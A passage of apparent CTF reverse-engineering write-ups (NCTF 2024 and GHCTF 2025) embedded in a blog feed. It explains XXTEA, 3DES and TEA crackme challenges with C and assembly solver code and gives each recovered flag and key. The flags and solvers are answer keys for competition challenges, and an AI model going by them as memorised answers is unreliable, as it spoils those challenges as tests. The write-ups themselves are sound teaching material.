0x9e3779b9</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MX (((z &gt;&gt; 5 ^ y <span class="string">&lt;&lt; 2) + (y &gt;</span>&gt; 3 ^ z &lt;&lt; 4)) ^ ((sum ^ y) + (key[(p &amp; 3) ^ e] ^ z)))</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MX2 (((z <span class="string">&lt;&lt; 5 ^ y &gt;</span>&gt; 2) + (y <span class="string">&lt;&lt; 3 ^ z &gt;</span>&gt; 4)) ^ ((sum ^ y) + (key2[(p &amp; 3) ^ e] ^ z)))</span></span><br><span class="line"></span><br><span class="line"><span class="type">uint32_t</span> key[]&#123; <span class="number">0x6e637466</span>, <span class="number">0x62ef0ed</span> ,<span class="number">0xa78c0b4f</span>, <span class="number">0x32303234</span> &#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">uint32_t</span> key2[]&#123; <span class="number">0x32303234</span>, <span class="number">0xd6eb12c3</span>, <span class="number">0x9f1cf72e</span>, <span class="number">0x4e435446</span> &#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">xxtea_decrypt1</span><span class="params">(<span class="type">uint32_t</span>* v, <span class="type">int</span> n)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">uint32_t</span> y, z, sum;</span><br><span class="line">    <span class="type">unsigned</span> rounds, e;</span><br><span class="line">    rounds = <span class="number">16</span>;</span><br><span class="line">    sum = DELTA * rounds;</span><br><span class="line">    y = v[<span class="number">0</span>]; </span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">        e = (sum &gt;&gt; <span class="number">2</span>) &amp; <span class="number">3</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> p = <span class="number">5</span> - <span class="number">1</span>; p &gt;= <span class="number">0</span>; p--)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (p == <span class="number">0</span>)</span><br><span class="line">                z = v[<span class="number">4</span>];</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">                z = v[(p<span class="number">-1</span>)%<span class="number">5</span>];</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (p == <span class="number">4</span>)</span><br><span class="line">                y = v[<span class="number">0</span>];</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">                y = v[p + <span class="number">1</span>];</span><br><span class="line"></span><br><span class="line">            v[p] -= MX;</span><br><span class="line">            </span><br><span class="line">        &#125;</span><br><span class="line">        sum -= DELTA;</span><br><span class="line">    &#125; <span class="keyword">while</span> (--rounds);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">xxtea_decrypt2</span><span class="params">(<span class="type">uint32_t</span>* v, <span class="type">int</span> n)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">uint32_t</span> y, z, sum;</span><br><span class="line">    <span class="type">unsigned</span> rounds, e;</span><br><span class="line">    rounds = <span class="number">16</span>;</span><br><span class="line">    sum = DELTA * rounds;</span><br><span class="line">    y = v[<span class="number">0</span>];</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">        e = (sum &gt;&gt; <span class="number">2</span>) &amp; <span class="number">3</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> p = <span class="number">5</span> - <span class="number">1</span>; p &gt;= <span class="number">0</span>; p--)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (p == <span class="number">0</span>)</span><br><span class="line">                z = v[<span class="number">4</span>];</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">                z = v[(p - <span class="number">1</span>) % <span class="number">5</span>];</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (p == <span class="number">4</span>)</span><br><span class="line">                y = v[<span class="number">0</span>];</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">                y = v[p + <span class="number">1</span>];</span><br><span class="line"></span><br><span class="line">            v[p] -= MX2;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">        sum -= DELTA;</span><br><span class="line">    &#125; <span class="keyword">while</span> (--rounds);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> enc1[] =</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="number">0x5D</span>, <span class="number">0x45</span>, <span class="number">0xD5</span>, <span class="number">0xB9</span>, <span class="number">0x8C</span>, <span class="number">0x95</span>, <span class="number">0x9C</span>, <span class="number">0x38</span>, <span class="number">0x3B</span>, <span class="number">0xB1</span>,</span><br><span class="line">      <span class="number">0x3E</span>, <span class="number">0x1E</span>, <span class="number">0x5F</span>, <span class="number">0xC8</span>, <span class="number">0xE8</span>, <span class="number">0xBB</span>, <span class="number">0x64</span>, <span class="number">0x38</span>, <span class="number">0x48</span>, <span class="number">0x69</span></span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> enc2[] =</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="number">0xDE</span>, <span class="number">0x81</span>, <span class="number">0xD8</span>, <span class="number">0xAD</span>, <span class="number">0xC2</span>, <span class="number">0xC4</span>, <span class="number">0xA6</span>, <span class="number">0x32</span>, <span class="number">0x1C</span>, <span class="number">0xAB</span>,</span><br><span class="line">      <span class="number">0x61</span>, <span class="number">0x3E</span>, <span class="number">0xCB</span>, <span class="number">0xFF</span>, <span class="number">0xEF</span>, <span class="number">0xF1</span>, <span class="number">0x27</span>, <span class="number">0x30</span>, <span class="number">0x7A</span>, <span class="number">0x16</span></span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">xxtea_decrypt1</span>((<span class="type">uint32_t</span>*)enc1, <span class="number">5</span>);</span><br><span class="line">    <span class="built_in">xxtea_decrypt2</span>((<span class="type">uint32_t</span>*)enc2, <span class="number">5</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%.20s%.20s\n&quot;</span>, enc1,enc2);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="flag-2"><a href="#flag-2" class="headerlink" title="flag"></a>flag</h3><p><code>NCTF&#123;H4rd_VM_with_Gor0ut1n3_5fc4b0be7ad&#125;</code></p><h2 id="XLogin"><a href="#XLogin" class="headerlink" title="XLogin"></a>XLogin</h2><h3 id="分析-3"><a href="#分析-3" class="headerlink" title="分析"></a>分析</h3><p>jadx加载发现代码中调用了Decstr函数来解密一些字符串，可以在libsimple.so里面找到DecStr函数实现。</p><p>具体解密字符串函数就是Base64换表解密后再异或上当前字符串长度值。</p><p><img src="/2025/03/24/NCTF2024/image-24.png" alt="alt text"></p><p>就可以解密得到这些实际字符串。</p><p><img src="/2025/03/24/NCTF2024/image-25.png" alt="alt text"></p><p><img src="/2025/03/24/NCTF2024/image-26.png" alt="alt text"></p><p>发现doCheck是在native里面，ida分析libnative.so，发现有个loadDex，应该是动态加载一个dex。</p><p><img src="/2025/03/24/NCTF2024/image-27.png" alt="alt text"></p><p>在loadDex下面就是doCheck函数实际实现。</p><p><img src="/2025/03/24/NCTF2024/image-28.png" alt="alt text"></p><p>通过特征可以发现是使用了3des加密，先猜测他没有魔改，毕竟那一坨代码没人想看。上面的ptr的两个数据（xmmword_1804和unk_1814共24字节数据）就是被加密的flag，3des加密后下面的while循环就是对加密后的数据与flag密文进行比对。</p><p><img src="/2025/03/24/NCTF2024/image-29.png" alt="alt text"></p><p><img src="/2025/03/24/NCTF2024/image-30.png" alt="alt text"></p><p>在apk的Assets里面会发现又有个libsimple.so，ida分析没有东西，直接拖入010发现存在一个dex结构头，前面的这64字节应该是没用的。</p><p><img src="/2025/03/24/NCTF2024/image-31.png" alt="alt text"></p><p>libnative.so里面loadDex跟到的函数验证了这个猜想，v13是Assets里的libsimple.so文件大小，减去了64，然后下面v17是读取起始指针，也加上了64，说明读取实际文件跳过了前64字节。</p><p><img src="/2025/03/24/NCTF2024/image-32.png" alt="alt text"></p><p>把前64字节去除，使用jadx分析。发现是Check函数，检测了username和password，和题目描述flag格式对应。username这边可以直接解密出来是<code>X1c@dM1n1$t</code>，然后使用username的MD5值作为密钥去调用doCheck加密。</p><p><img src="/2025/03/24/NCTF2024/image-33.png" alt="alt text"></p><p>密钥：<code>7d53ecd36a43d3d237e7dd633dcf8497</code></p><p>然后提取密文进行3des解密即可，然后这边有个端序问题卡了不少师傅一段时间，密文以及密钥都要以8字节位一组转换到大端序，才能解密，然后解密完的明文也要从大端序转回到小端序。</p><h3 id="解密-3"><a href="#解密-3" class="headerlink" title="解密"></a>解密</h3><p><img src="/2025/03/24/NCTF2024/image-34.png" alt="alt text"></p><p>解密完将明文以8字节一组倒序得到明文<code>SafePWD~5y$x?YM+5U05Gm6=</code></p><h3 id="flag-3"><a href="#flag-3" class="headerlink" title="flag"></a>flag</h3><p><code>NCTF&#123;X1c@dM1n1$t_SafePWD~5y$x?YM+5U05Gm6=&#125;</code></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;NCTF-2024-Reverse-WP&quot;&gt;&lt;a href=&quot;#NCTF-2024-Reverse-WP&quot; class=&quot;headerlink&quot; title=&quot;NCTF 2024 Reverse WP&quot;&gt;&lt;/a&gt;NCTF 2024 Reverse WP&lt;/h1&gt;&lt;</summary>
      
    
    
    
    
    <category term="CTF比赛" scheme="https://tkazer.github.io/tags/CTF%E6%AF%94%E8%B5%9B/"/>
    
  </entry>
  
  <entry>
    <title>GHCTF2025WP</title>
    <link href="https://tkazer.github.io/2025/03/06/GHCTF2025WP/"/>
    <id>https://tkazer.github.io/2025/03/06/GHCTF2025WP/</id>
    <published>2025-03-06T02:37:20.000Z</published>
    <updated>2025-03-24T11:15:54.372Z</updated>
    
    <content type="html"><![CDATA[<h1 id="GHCTF-2025-Reverse-WP"><a href="#GHCTF-2025-Reverse-WP" class="headerlink" title="GHCTF 2025 Reverse WP"></a>GHCTF 2025 Reverse WP</h1><p>这次也是第一次给CTF比赛出题，经验不足，完全是凭借之前打比赛做的题的经验来出的，难度尽可能把控住梯度上升，但是可能还是没做的那么好，各位师傅见谅了，如果有什么建议也可以联系我。</p><h2 id="ASN-Signin"><a href="#ASN-Signin" class="headerlink" title="ASN?Signin!"></a>ASN?Signin!</h2><h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p>这题估计大伙都AI一把梭了（），不过还是讲讲asm代码分析流程。</p><p>asm代码开头是数据段，存放着DATA1和DATA2，这两段就是关键数据。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">.DATA</span><br><span class="line">    WELCOME_MSG db &#x27;Welcome to GHCTF!&#x27;, 0DH, 0AH, &#x27;$&#x27;</span><br><span class="line">    INPUT_MSG db &#x27;Input your flag:&#x27;, &#x27;$&#x27;</span><br><span class="line"></span><br><span class="line">    WRONG_MSG db 0DH, 0AH, &#x27;Wrong!&#x27;, 0DH, 0AH, &#x27;$&#x27;</span><br><span class="line">    RIGHT_MSG db 0DH, 0AH, &#x27;Right!&#x27;, 0DH, 0AH, &#x27;$&#x27;</span><br><span class="line">    </span><br><span class="line">    DATA1 DB 26H,27H,24H,25H,2AH,2BH,28H,00H</span><br><span class="line">            DB 2EH,2FH,2CH,2DH,32H,33H,30H,00H</span><br><span class="line">            DB 36H,37H,34H,35H,3AH,3BH,38H,39H</span><br><span class="line">            DB 3EH,3FH,3CH,3DH,3FH,27H,34H,11H</span><br><span class="line">    </span><br><span class="line">    DATA2 DB 69H,77H,77H,66H,73H,72H,4FH,46H</span><br><span class="line">            DB 03H,47H,6FH,79H,07H,41H,13H,47H</span><br><span class="line">            DB 5EH,67H,5FH,09H,0FH,58H,63H,7DH</span><br><span class="line">            DB 5FH,77H,68H,35H,62H,0DH,0DH,50H</span><br><span class="line">    </span><br><span class="line">    BUFFER1 db 33 dup(0)</span><br><span class="line">    BUFFER2 db 33 dup(0)</span><br><span class="line">.CODE</span><br></pre></td></tr></table></figure><p>下面这部分就是程序启动时执行代码，读入33字节到BUFFER1中，然后CALL DO1函数，再CALL ENC函数，最后LOOP1进行比对跳转到结果输出。所以可知DATA2就是加密后的Flag数据。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">START:</span><br><span class="line">    MOV AX,@DATA</span><br><span class="line">    MOV DS,AX</span><br><span class="line">    MOV AH,09H</span><br><span class="line">    MOV DX,OFFSET WELCOME_MSG</span><br><span class="line">    INT 21H</span><br><span class="line">    MOV DX,OFFSET INPUT_MSG</span><br><span class="line">    INT 21H</span><br><span class="line">    MOV AH,0AH</span><br><span class="line">    MOV DX,OFFSET BUFFER1</span><br><span class="line">    MOV BYTE PTR[BUFFER1],33    ; 读入33字节到BUFFER1</span><br><span class="line">    INT 21H</span><br><span class="line">    CALL DO1                    ; Call DO1</span><br><span class="line">    CALL ENC                    ; Call ENC</span><br><span class="line">    MOV SI,OFFSET BUFFER1 + 2</span><br><span class="line">    MOV DI,OFFSET DATA2</span><br><span class="line">    MOV CX,32</span><br><span class="line">LOOP1:                          ; 比对DATA2和加密后的数据</span><br><span class="line">    MOV AL,[SI]</span><br><span class="line">    CMP AL,[DI]</span><br><span class="line">    JNE P2</span><br><span class="line">    INC SI</span><br><span class="line">    INC DI</span><br><span class="line">    LOOP LOOP1</span><br><span class="line">P1:</span><br><span class="line">    MOV AH,09H</span><br><span class="line">    LEA DX,RIGHT_MSG            ; 输出正确信息</span><br><span class="line">    INT 21H</span><br><span class="line">    JMP EXIT_PROGRAM</span><br><span class="line">P2:</span><br><span class="line">    MOV AH,09H</span><br><span class="line">    LEA DX,WRONG_MSG            ; 输出错误信息</span><br><span class="line">    INT 21H</span><br></pre></td></tr></table></figure><p>以下是DO1函数和DO2函数代码，可以看到是针对DATA1进行的一些操作。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">DO1 PROC</span><br><span class="line">    PUSH SI</span><br><span class="line">    PUSH DI</span><br><span class="line">    PUSH CX</span><br><span class="line">    XOR SI,SI</span><br><span class="line">    MOV CX,8</span><br><span class="line">SWAP_LOOP:</span><br><span class="line">    PUSH CX</span><br><span class="line">    MOV DI,SI</span><br><span class="line">    ADD DI,4</span><br><span class="line">    CMP DI,28</span><br><span class="line">    JL NOWRAP</span><br><span class="line">    SUB DI,28</span><br><span class="line">NOWRAP:</span><br><span class="line">    MOV BX,SI</span><br><span class="line">    CALL DO2</span><br><span class="line">    ADD SI,4</span><br><span class="line">    POP CX</span><br><span class="line">    LOOP SWAP_LOOP</span><br><span class="line">    POP CX</span><br><span class="line">    POP DI</span><br><span class="line">    POP SI</span><br><span class="line">    RET</span><br><span class="line">DO1 ENDP</span><br><span class="line"></span><br><span class="line">DO2 PROC</span><br><span class="line">    PUSH CX</span><br><span class="line">    MOV CX,4</span><br><span class="line">LOOP3:</span><br><span class="line">    MOV AL,DATA1[BX]</span><br><span class="line">    MOV AH,DATA1[DI]</span><br><span class="line">    MOV DATA1[BX],AH</span><br><span class="line">    MOV DATA1[DI],AL</span><br><span class="line">    INC BX</span><br><span class="line">    INC DI</span><br><span class="line">    LOOP LOOP3</span><br><span class="line">    POP CX</span><br><span class="line">    RET</span><br><span class="line">DO2 ENDP</span><br></pre></td></tr></table></figure><p>下面这部分是ENC函数代码，是利用DO1后的DATA1数据与输入的字符进行XOR操作，注意到xor操作都是在WORD，也就是二字节的基础上进行操作。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">ENC PROC</span><br><span class="line">    PUSH CX</span><br><span class="line">    MOV SI,OFFSET BUFFER1 + 2</span><br><span class="line">    MOV DI,OFFSET DATA1</span><br><span class="line">    MOV CX,8</span><br><span class="line">LOOP2:</span><br><span class="line">    MOV AX,WORD PTR[DI + 1]</span><br><span class="line">    XOR WORD PTR[SI],AX             ; *(SHORT*)(Input + i) ^= *(SHORT*)(DATA1 + i + 1)</span><br><span class="line">    MOV AX,WORD PTR[DI + 2]</span><br><span class="line">    XOR WORD PTR[SI + 2],AX         ; *(SHORT*)(Input + i + 2) ^= *(SHORT*)(DATA1 + i + 2)</span><br><span class="line">    ADD SI,4</span><br><span class="line">    ADD DI,4</span><br><span class="line">    LOOP LOOP2</span><br><span class="line">    POP CX</span><br><span class="line">    RET</span><br><span class="line">ENC ENDP</span><br></pre></td></tr></table></figure><p>由于DO1和DO2只是对DATA1这个静态数据进行操作，所以可以直接动调拦截到执行完DO1的DATA1数据进行对DATA2的解密。这题ASM代码故意给全的，就是为了让选手可以直接编译到EXE并且使用DosBox动调，（大伙入门8086汇编应该都用过的工具）。</p><p>直接g命令执行到DO1函数，并且p命令步过，</p><p><img src="/2025/03/06/GHCTF2025WP/1.png" alt="alt text"></p><p>再t命令步入ENC函数，再u命令反汇编就可以看到DATA1的地址。</p><p><img src="/2025/03/06/GHCTF2025WP/2.png" alt="alt text"></p><p>直接d命令就可以看到DATA1的数据，提取出来与DATA2进行解密计算即可得到flag。</p><p><img src="/2025/03/06/GHCTF2025WP/3.png" alt="alt text"></p><p>解密代码：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">uint8_t</span> DATA1[] = &#123;</span><br><span class="line">        <span class="number">0x26</span>, <span class="number">0x27</span>, <span class="number">0x24</span>, <span class="number">0x25</span>, <span class="number">0x3e</span>, <span class="number">0x27</span>, <span class="number">0x34</span>,</span><br><span class="line">        <span class="number">0x11</span>, <span class="number">0x32</span>, <span class="number">0x33</span>, <span class="number">0x30</span>, <span class="number">0x00</span>, <span class="number">0x36</span>, <span class="number">0x37</span>,</span><br><span class="line">        <span class="number">0x34</span>, <span class="number">0x35</span>, <span class="number">0x3a</span>, <span class="number">0x3b</span>, <span class="number">0x38</span>, <span class="number">0x39</span>, <span class="number">0x3e</span>,</span><br><span class="line">        <span class="number">0x3f</span>, <span class="number">0x3c</span>, <span class="number">0x3d</span>, <span class="number">0x2a</span>, <span class="number">0x2b</span>, <span class="number">0x28</span>, <span class="number">0x00</span>,</span><br><span class="line">        <span class="number">0x2e</span>, <span class="number">0x2f</span>, <span class="number">0x2c</span>, <span class="number">0x2d</span>&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="type">uint8_t</span> DATA2[] = &#123;</span><br><span class="line">        <span class="number">0x69</span>, <span class="number">0x77</span>, <span class="number">0x77</span>, <span class="number">0x66</span>, <span class="number">0x73</span>, <span class="number">0x72</span>, <span class="number">0x4F</span>,</span><br><span class="line">        <span class="number">0x46</span>, <span class="number">0x03</span>, <span class="number">0x47</span>, <span class="number">0x6F</span>, <span class="number">0x79</span>, <span class="number">0x07</span>, <span class="number">0x41</span>,</span><br><span class="line">        <span class="number">0x13</span>, <span class="number">0x47</span>, <span class="number">0x5E</span>, <span class="number">0x67</span>, <span class="number">0x5F</span>, <span class="number">0x09</span>, <span class="number">0x0F</span>,</span><br><span class="line">        <span class="number">0x58</span>, <span class="number">0x63</span>, <span class="number">0x7D</span>, <span class="number">0x5F</span>, <span class="number">0x77</span>, <span class="number">0x68</span>, <span class="number">0x35</span>,</span><br><span class="line">        <span class="number">0x62</span>, <span class="number">0x0D</span>, <span class="number">0x0D</span>, <span class="number">0x50</span>&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">32</span>; i += <span class="number">4</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        *(<span class="type">uint16_t</span> *)(DATA2 + i) ^= *(<span class="type">uint16_t</span> *)(DATA1 + i + <span class="number">1</span>);</span><br><span class="line">        *(<span class="type">uint16_t</span> *)(DATA2 + i + <span class="number">2</span>) ^= *(<span class="type">uint16_t</span> *)(DATA1 + i + <span class="number">2</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%.32s\n&quot;</span>, DATA2);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="Flag值"><a href="#Flag值" class="headerlink" title="Flag值"></a>Flag值</h3><p><code>NSSCTF&#123;W0w_y0u&#39;re_g00d_@t_@5M!!&#125;</code></p><h2 id="LockedSecret"><a href="#LockedSecret" class="headerlink" title="LockedSecret"></a>LockedSecret</h2><h3 id="分析-1"><a href="#分析-1" class="headerlink" title="分析"></a>分析</h3><p>这题本来是当作第一批第二难度的题，实际题解远低于FishingKit（），没想到展开Tea卡住了不少人了。</p><p>前面常规UPX变异脱壳就跳过讲解了，不会的新生可以去看文章再学习学习。<br>将脱完壳的程序拖入IDA分析，可以看到主函数内共有两个关键函数调用，byte_3F4060就是加密后的Flag。</p><p><img src="/2025/03/06/GHCTF2025WP/4.png" alt="alt text"></p><p>第一个函数的利用伪随机对一个全局数组进行初始化赋值。</p><p><img src="/2025/03/06/GHCTF2025WP/5.png" alt="alt text"></p><p>第二个函数就是加密函数，将一串明文key与上一个函数初始化的值进行异或计算得到用于加密的Key。底下加密部分代码由于IDA的反反编译器问题，导致有点丑陋，但是还是可以看出Tea加密的特征，只不过和常规Tea相比似乎少了循环。</p><p><img src="/2025/03/06/GHCTF2025WP/6.png" alt="alt text"></p><p>换到Ghidra分析得到的伪代码会更简洁，可以很清楚的看出就是Tea加密，不过用重复计算和不同的sum值来代替了循环加密。</p><p>将第二次计算的bc46effe减去5e2377ff会发现结果还是5e2377ff，所以可以知道5e2377ff就是delta值，那么这就是一个完整的从delta值开始的Tea加密。</p><p>并且两两计算为一组，可以看出是8轮加密的Tea，并且最后将加密完的值再异或上了0xf。</p><p><img src="/2025/03/06/GHCTF2025WP/7.png" alt="alt text"></p><p>直接断点该处获得Key，进行8轮的Tea解密即可得到Flag。</p><p><img src="/2025/03/06/GHCTF2025WP/8.png" alt="alt text"></p><p>解密代码：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">tea_decrypt</span><span class="params">(<span class="type">uint32_t</span> v[<span class="number">2</span>], <span class="type">const</span> <span class="type">uint32_t</span> k[<span class="number">4</span>])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">uint32_t</span> v0 = v[<span class="number">0</span>], v1 = v[<span class="number">1</span>];</span><br><span class="line"></span><br><span class="line">    <span class="type">uint32_t</span> sum = <span class="number">0x5E2377FF</span> * <span class="number">8</span>;</span><br><span class="line"></span><br><span class="line">    <span class="type">uint32_t</span> delta = <span class="number">0x5E2377FF</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">uint32_t</span> i = <span class="number">0</span>; i &lt; <span class="number">8</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        v1 -= ((v0 &lt;&lt; <span class="number">4</span>) + k[<span class="number">2</span>]) ^ (v0 + sum) ^ ((v0 &gt;&gt; <span class="number">5</span>) + k[<span class="number">3</span>]);</span><br><span class="line">        v0 -= ((v1 &lt;&lt; <span class="number">4</span>) + k[<span class="number">0</span>]) ^ (v1 + sum) ^ ((v1 &gt;&gt; <span class="number">5</span>) + k[<span class="number">1</span>]);</span><br><span class="line">        sum -= delta;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    v[<span class="number">0</span>] = v0;</span><br><span class="line">    v[<span class="number">1</span>] = v1;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> Key[] =</span><br><span class="line">&#123;</span><br><span class="line">        <span class="number">0x2D</span>,<span class="number">0xF7</span>,<span class="number">0x3D</span>,<span class="number">0x42</span>,<span class="number">0x01</span>,<span class="number">0x9A</span>,<span class="number">0xF5</span>,<span class="number">0x05</span>,<span class="number">0x1D</span>,<span class="number">0xCF</span>,<span class="number">0x3F</span>,<span class="number">0x63</span>,<span class="number">0x22</span>,<span class="number">0x91</span>,<span class="number">0xD1</span>,<span class="number">0x77</span></span><br><span class="line">&#125;; </span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> EncFlag[] = &#123; </span><br><span class="line">    <span class="number">0xDC</span>,<span class="number">0x45</span>,<span class="number">0x1E</span>,<span class="number">0x03</span>,<span class="number">0x89</span>,</span><br><span class="line">    <span class="number">0xE9</span>,<span class="number">0x76</span>,<span class="number">0x27</span>,<span class="number">0x47</span>,<span class="number">0x48</span>,</span><br><span class="line">    <span class="number">0x23</span>,<span class="number">0x01</span>,<span class="number">0x70</span>,<span class="number">0xD2</span>,<span class="number">0xCE</span>,</span><br><span class="line">    <span class="number">0x64</span>,<span class="number">0xDA</span>,<span 